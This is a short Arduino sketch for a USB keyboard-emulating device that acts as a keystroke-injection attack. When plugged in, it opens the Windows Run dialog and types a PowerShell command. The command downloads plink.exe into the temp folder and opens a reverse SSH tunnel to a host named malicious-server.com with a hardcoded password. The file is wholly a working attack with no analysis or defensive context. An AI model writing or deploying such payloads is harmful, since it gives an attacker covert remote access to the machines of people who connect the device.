#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("powershell Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -OutFile $env:TEMP\\plink.exe; $env:TEMP\\plink.exe -ssh -N -R 8080:localhost:80 user@malicious-server.com -pw P@ssw0rd!"));
}

void loop() {}
